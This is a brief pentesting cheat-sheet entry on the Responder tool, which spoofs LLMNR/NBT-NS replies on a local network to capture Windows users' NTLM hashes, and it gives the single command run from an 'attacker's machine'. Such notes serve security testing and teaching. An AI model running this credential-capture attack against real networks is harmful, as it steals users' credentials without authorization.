## Responder
Tool that intercept LLMNR/NBT-NS broadcast requests, spoof the server and send responses to victim.
Can collect NTLM Hash of windows users when he sends broadcast request

From Linux attacker's machine:
```
sudo responder - I eth0
```
and wait for broadcast requests
